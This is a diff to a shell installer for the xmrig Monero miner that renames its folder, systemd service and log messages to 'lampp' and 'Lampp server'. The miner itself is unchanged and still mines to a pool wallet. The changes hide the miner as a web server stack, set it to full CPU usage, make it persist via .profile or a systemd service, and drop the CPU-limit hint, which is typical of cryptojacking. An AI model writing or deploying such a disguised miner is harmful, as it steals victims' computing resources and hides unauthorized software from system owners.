@@ -126,21 +126,21 @@ if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig
 fi
 
 
-[ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
+[ -d $HOME/lampp ] || mkdir $HOME/lampp
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/lampp; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/lampp directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
 
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/moneroocean/config.json
-$HOME/moneroocean/xmrig --help >/dev/null
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/lampp/config.json
+$HOME/lampp/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/moneroocean/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig is not functional"
+  if [ -f $HOME/lampp/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/lampp/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/lampp/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -153,26 +153,26 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/lampp"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/lampp --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/lampp directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/moneroocean/config.json
-  $HOME/moneroocean/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/lampp/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/lampp/config.json
+  $HOME/lampp/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/moneroocean/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/moneroocean/xmrig is not functional too"
+    if [ -f $HOME/lampp/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/lampp/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/moneroocean/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/lampp/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/moneroocean/xmrig is OK"
+echo "[*] Miner $HOME/lampp/xmrig is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -185,43 +185,43 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
-sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/moneroocean/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/lampp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/lampp/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/lampp/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/lampp/config.json
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/lampp/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/lampp/xmrig.log'",#' $HOME/lampp/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/lampp/config.json
 
-cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_background.json
+cp $HOME/lampp/config.json $HOME/lampp/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/lampp/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HOME/moneroocean/miner.sh script"
-cat >$HOME/moneroocean/miner.sh <<EOL
+echo "[*] Creating $HOME/lampp/miner.sh script"
+cat >$HOME/lampp/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HOME/moneroocean/xmrig \$*
+  nice $HOME/lampp/xmrig \$*
 else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
+  echo "Lampp is already running in the background. Refusing to run another one."
+  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove it first."
 fi
 EOL
 
-chmod +x $HOME/moneroocean/miner.sh
+chmod +x $HOME/lampp/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep moneroocean/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/moneroocean/miner.sh script to $HOME/.profile"
-    echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep lampp/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/lampp/miner.sh script to $HOME/.profile"
+    echo "$HOME/lampp/miner.sh --config=$HOME/lampp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/lampp/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
-  /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
+  echo "[*] Running in the background (see logs in $HOME/lampp/logs.log file)"
+  /bin/bash $HOME/lampp/miner.sh --config=$HOME/lampp/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -232,20 +232,20 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
-    /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
+    echo "[*] Running in the background (see logs in $HOME/lampp/logs.log file)"
+    /bin/bash $HOME/lampp/miner.sh --config=$HOME/lampp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating moneroocean_miner systemd service"
-    cat >/tmp/moneroocean_miner.service <<EOL
+    echo "[*] Creating lampp systemd service"
+    cat >/tmp/lampp.service <<EOL
 [Unit]
-Description=Monero miner service
+Description=Lampp server
 
 [Service]
-ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
+ExecStart=$HOME/lampp/xmrig --config=$HOME/lampp/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -253,27 +253,15 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
+    sudo mv /tmp/lampp.service /etc/systemd/system/lampp.service
     echo "[*] Starting systemd service"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable moneroocean_miner.service
-    sudo systemctl start moneroocean_miner.service
+    sudo systemctl enable lampp.service
+    sudo systemctl start lampp.service
   fi
 fi
 
-echo ""if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
-  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
-  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  else
-    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  fi
-else
-  echo "done"
-fi
 echo ""
 
 echo "[*] Setup complete"
